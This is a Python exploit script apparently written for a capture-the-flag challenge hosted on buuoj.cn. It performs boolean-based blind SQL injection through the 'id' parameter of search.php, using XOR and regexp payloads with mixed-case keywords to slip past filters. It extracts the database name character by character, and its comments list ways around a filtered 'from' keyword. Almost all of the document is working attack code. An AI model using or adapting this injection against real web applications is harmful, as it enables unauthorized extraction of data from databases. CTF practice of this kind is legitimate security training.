#!/usr/bin/env python3
import requests
import time
import string

url = "http://0a24f8a2-89ab-4896-b827-a4e6d5660cda.node5.buuoj.cn:81/search.php"

def check(payload):
    """True = 条件为真(ERROR), False = 条件为假(Clever)"""
    try:
        r = requests.get(url, params={"id": payload}, timeout=10)
        return "ERROR" in r.text or "Error" in r.text
    except:
        return False

def blind_regexp(query, name=""):
    """使用 regexp 盲注提取数据"""
    result = ""
    charset = string.ascii_lowercase + string.digits + "_-{}" + string.ascii_uppercase
    
    for pos in range(1, 50):
        found = False
        for c in charset:
            # 构造 regexp 查询
            pattern = f"^{result}{c}"
            payload = f"6^(SeLeCt(({query})regexp\"{pattern}\"))"
            if check(payload):
                result += c
                print(f"    {name}: {result}")
                found = True
                break
        if not found:
            break
    return result

# 获取数据库名
print("[*] Getting database name...")
db = blind_regexp("database()", "Database")

# 尝试获取表名
# 由于 from 被过滤，需要找其他方法
# 尝试使用 mysql.innodb_table_stats 或 sys.schema_table_statistics

print("\n[*] Done!")
